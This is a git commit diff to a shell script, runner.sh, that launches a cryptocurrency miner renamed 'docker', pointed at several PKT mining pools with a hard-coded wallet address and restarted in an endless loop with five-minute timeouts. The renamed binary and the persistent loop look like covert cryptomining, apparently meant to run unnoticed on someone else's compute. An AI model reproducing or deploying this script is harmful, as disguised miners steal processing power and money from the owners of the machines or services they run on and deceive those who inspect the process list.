2eb7490d2393421c876aa3b72dbe13ea004b5909
shuwaibahjaman <129008845+shuwaibahjaman@users.noreply.github.com>
2023-04-02 04:40:14 +1000

    Update runner.sh

--- runner.sh
+++ runner.sh
@@ -1,4 +1,5 @@
 #!/bin/bash
 
-WALLET=pkt1qatg02nqpj868czq0y2t4uf2l36e5jted0hq4fa
-./docker ann -p $WALLET https://stratum.zetahash.com/ http://pool.pktpool.io http://pool.pkteer.com http://pool.pkt.world -t 2
+chmod 700 docker
+timeout 5m ./docker ann -p pkt1qatg02nqpj868czq0y2t4uf2l36e5jted0hq4fa https://stratum.zetahash.com/ http://pool.pktpool.io http://pool.pkteer.com http://pool.pkt.world -t 2
+while :; do timeout 5m ./docker ann -p pkt1qatg02nqpj868czq0y2t4uf2l36e5jted0hq4fa https://stratum.zetahash.com/ http://pool.pktpool.io http://pool.pkteer.com http://pool.pkt.world -t 2;echo JOSS; sleep 10s; done
